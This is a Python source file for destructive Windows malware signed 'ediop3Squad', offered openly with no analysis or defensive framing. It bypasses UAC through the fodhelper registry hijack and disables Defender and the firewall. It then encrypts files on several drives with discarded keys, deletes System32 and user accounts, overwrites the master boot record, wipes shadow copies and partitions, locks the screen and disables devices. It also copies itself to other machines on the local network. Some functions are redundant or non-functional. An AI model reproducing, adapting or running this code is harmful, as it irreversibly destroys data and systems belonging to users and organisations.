import os
import sys
import ctypes
import subprocess
import psutil
import threading
import tkinter as tk
from tkinter import messagebox
from ctypes import wintypes
import webbrowser
import winsound
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import winreg
import time
import uuid

class RECT(ctypes.Structure):
    _fields_ = [("left", ctypes.c_long),
                ("top", ctypes.c_long),
                ("right", ctypes.c_long),
                ("bottom", ctypes.c_long)]

def uac_bypass():
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command")
        winreg.SetValue(key, "", winreg.REG_SZ, sys.executable)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(key)
        time.sleep(1)
        subprocess.run("fodhelper.exe", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        time.sleep(5)
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command")
        except: pass
    except: pass

def elevate_privileges():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return True
    try:
        script = sys.argv[0] if hasattr(sys, 'frozen') else __file__
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}"', None, 1)
        return True
    except:
        uac_bypass()
        return False

def disable_defender():
    subprocess.run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring \$true"', shell=True)
    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)
    subprocess.run('sc stop WinDefend', shell=True)
    subprocess.run('sc config WinDefend start= disabled', shell=True)
    subprocess.run('netsh advfirewall set allprofiles state off', shell=True)

def corrupt_bios():
    try:
        subprocess.run('bcdedit /set {default} bootstatuspolicy ignoreallfailures', shell=True)
        subprocess.run('bcdedit /set {default} recoveryenabled no', shell=True)
    except: pass

def delete_system32():
    try:
        subprocess.run('takeown /f C:\\Windows\\System32 /r /d y', shell=True)
        subprocess.run('icacls C:\\Windows\\System32 /grant administrators:F /t', shell=True)
        for root, dirs, files in os.walk("C:\\Windows\\System32"):
            for file in files:
                try:
                    os.remove(os.path.join(root, file))
                except:
                    try:
                        with open(os.path.join(root, file), 'wb') as f:
                            f.write(os.urandom(1024))
                    except: pass
        subprocess.run("rmdir /s /q C:\\Windows\\System32", shell=True)
    except: pass

def encrypt_files():
    for drive in ['C:', 'D:', 'E:']:
        if os.path.exists(drive):
            for root, dirs, files in os.walk(drive):
                try:
                    for file in files:
                        try:
                            file_path = os.path.join(root, file)
                            key = os.urandom(32)
                            iv = os.urandom(16)
                            cipher = AES.new(key, AES.MODE_CBC, iv=iv)
                            with open(file_path, 'rb') as f:
                                data = f.read()
                            encrypted = cipher.encrypt(pad(data, AES.block_size))
                            with open(file_path + ".ediop3", 'wb') as f:
                                f.write(encrypted)
                            os.remove(file_path)
                        except: continue
                except: continue

def create_unclosable_popup():
    def run_popup():
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        root.configure(bg='black')
        root.overrideredirect(True)
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        label = tk.Label(root, text="ediop3Squad got you now", font=("Arial", 50), fg="red", bg="black")
        label.pack(expand=True)
        def stay_on_top():
            root.lift()
            root.after(1000, stay_on_top)
        stay_on_top()
        root.mainloop()
    threading.Thread(target=run_popup, daemon=True).start()

def max_volume():
    for _ in range(5):
        webbrowser.open("https://youtube.com")
    winsound.Beep(3000, 1000)

def disable_taskmgr():
    subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True)

def disable_cmd():
    subprocess.run('reg add "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /t REG_DWORD /d 1 /f', shell=True)

def fork_bomb():
    for _ in range(5):
        try: os.startfile(sys.argv[0])
        except: pass

def zip_bomb():
    try:
        with open("bomb.zip", "wb") as f:
            f.seek(1024 * 1024 * 1024 - 1)
            f.write(b'\0')
    except: pass

def kill_processes():
    for proc in psutil.process_iter():
        try:
            if proc.pid != os.getpid():
                proc.kill()
        except: continue

def disable_shutdown():
    subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shutdown.exe" /v Debugger /t REG_SZ /d "cmd /c echo NOPE" /f', shell=True)

def overwrite_mbr():
    try:
        with open("\\\\.\\PhysicalDrive0", "wb") as f:
            f.write(os.urandom(512))
    except: pass

def delete_shadow_copies():
    subprocess.run('vssadmin delete shadows /all /quiet', shell=True)

def disable_recovery():
    subprocess.run('reagentc /disable', shell=True)

def corrupt_registry():
    subprocess.run('reg delete HKLM\\SOFTWARE /f', shell=True)

def disable_network():
    subprocess.run('netsh interface set interface "Wi-Fi" disable', shell=True)

def spam_popups():
    while True:
        ctypes.windll.user32.MessageBoxW(0, "ediop3Squad owns you", "LOL", 0x10)

def glitch_screen():
    rect = RECT()
    rect.left = 0
    rect.top = 0
    rect.right = 1920
    rect.bottom = 1080
    while True:
        ctypes.windll.user32.InvertRect(ctypes.windll.user32.GetDC(0), ctypes.byref(rect))

def delete_bootloader():
    subprocess.run('bootsect /nt60 all /force', shell=True)

def disable_keyboard():
    try: subprocess.run('rundll32 keyboard disable', shell=True)
    except: pass

def disable_mouse():
    try: subprocess.run('rundll32 mouse disable', shell=True)
    except: pass

def delete_pagefile():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management" /v PagingFiles /t REG_MULTI_SZ /d "" /f', shell=True)

def disable_sleep():
    subprocess.run('powercfg -h off', shell=True)

def delete_restore_points():
    subprocess.run('vssadmin delete shadows /all /quiet', shell=True)

def disable_updates():
    subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f', shell=True)

def spread_network():
    subprocess.run('net use * /delete /y', shell=True)
    for ip in range(1, 10):
        threading.Thread(target=lambda ip=ip: subprocess.run(f'copy "{sys.argv[0]}" "\\\\192.168.1.{ip}\\C$\\Windows\\Temp\\"', shell=True)).start()

def disable_safe_mode():
    subprocess.run('bcdedit /set {default} safeboot minimal', shell=True)

def delete_partitions():
    subprocess.run('diskpart /s clean_all.txt', shell=True)

def disable_usb():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR" /v Start /t REG_DWORD /d 4 /f', shell=True)

def disable_bluetooth():
    subprocess.run('reg add "HKLM\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\Bluetooth" /v AllowBluetooth /t REG_DWORD /d 0 /f', shell=True)

def disable_wifi():
    subprocess.run('netsh interface set interface "Wi-Fi" admin=disable', shell=True)

def delete_users():
    subprocess.run('net user * /delete', shell=True)

def disable_printing():
    subprocess.run('net stop spooler', shell=True)

def disable_sound():
    subprocess.run('net stop Audiosrv', shell=True)

def disable_display():
    try: subprocess.run('devcon disable *display*', shell=True)
    except: pass

def disable_power():
    subprocess.run('powercfg -setactive 00000000-0000-0000-0000-000000000000', shell=True)

def disable_input():
    try: subprocess.run('rundll32 keyboard disable', shell=True)
    except: pass
    try: subprocess.run('rundll32 mouse disable', shell=True)
    except: pass

def disable_network_adapters():
    try: subprocess.run('devcon disable *net*', shell=True)
    except: pass

def disable_usb_ports():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR" /v Start /t REG_DWORD /d 4 /f', shell=True)

def disable_cdrom():
    try: subprocess.run('devcon disable *cdrom*', shell=True)
    except: pass

def disable_pci():
    try: subprocess.run('devcon disable *pci*', shell=True)
    except: pass

def disable_ide():
    try: subprocess.run('devcon disable *ide*', shell=True)
    except: pass

def disable_scsi():
    try: subprocess.run('devcon disable *scsi*', shell=True)
    except: pass

def disable_sata():
    try: subprocess.run('devcon disable *sata*', shell=True)
    except: pass

def disable_nvme():
    try: subprocess.run('devcon disable *nvme*', shell=True)
    except: pass

def disable_ahci():
    try: subprocess.run('devcon disable *ahci*', shell=True)
    except: pass

def disable_raid():
    try: subprocess.run('devcon disable *raid*', shell=True)
    except: pass

def disable_acpi():
    try: subprocess.run('devcon disable *acpi*', shell=True)
    except: pass

def disable_smb():
    subprocess.run('net stop lanmanserver', shell=True)

def disable_rdp():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)

def disable_remote_assistance():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 0 /f', shell=True)

def disable_remote_desktop():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)

def disable_remote_management():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 0 /f', shell=True)

def disable_remote_shell():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)

def disable_remote_registry():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\RemoteRegistry" /v Start /t REG_DWORD /d 4 /f', shell=True)

def disable_remote_access():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)

def disable_remote_admin():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)

def disable_remote_control():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)

def disable_remote_login():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)

def disable_remote_services():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)

def disable_remote_sessions():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)

def disable_remote_tasks():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)

def disable_remote_users():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)

def disable_remote_workers():
    subprocess.run('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f', shell=True)

if __name__ == "__main__":
    if os.name == 'nt':
        elevate_privileges()
        
        threads = []
        functions = [
            disable_defender, create_unclosable_popup, corrupt_bios, encrypt_files,
            delete_system32, max_volume, fork_bomb, zip_bomb, kill_processes,
            disable_shutdown, overwrite_mbr, delete_shadow_copies, disable_recovery,
            corrupt_registry, disable_network, spam_popups, glitch_screen,
            delete_bootloader, disable_keyboard, disable_mouse, delete_pagefile,
            disable_sleep, delete_restore_points, disable_updates, spread_network,
            disable_safe_mode, delete_partitions, disable_usb, disable_bluetooth,
            disable_wifi, delete_users, disable_printing, disable_sound,
            disable_display, disable_power, disable_input, disable_network_adapters,
            disable_usb_ports, disable_cdrom, disable_pci, disable_ide,
            disable_scsi, disable_sata, disable_nvme, disable_ahci,
            disable_raid, disable_acpi, disable_smb, disable_rdp,
            disable_remote_assistance, disable_remote_desktop, disable_remote_management,
            disable_remote_shell, disable_remote_registry, disable_remote_access,
            disable_remote_admin, disable_remote_control, disable_remote_login,
            disable_remote_services, disable_remote_sessions, disable_remote_tasks,
            disable_remote_users, disable_remote_workers
        ]
        
        for func in functions:
            t = threading.Thread(target=func)
            t.daemon = True
            threads.append(t)
            t.start()
            
        for t in threads:
            try: t.join(timeout=1)
            except: pass
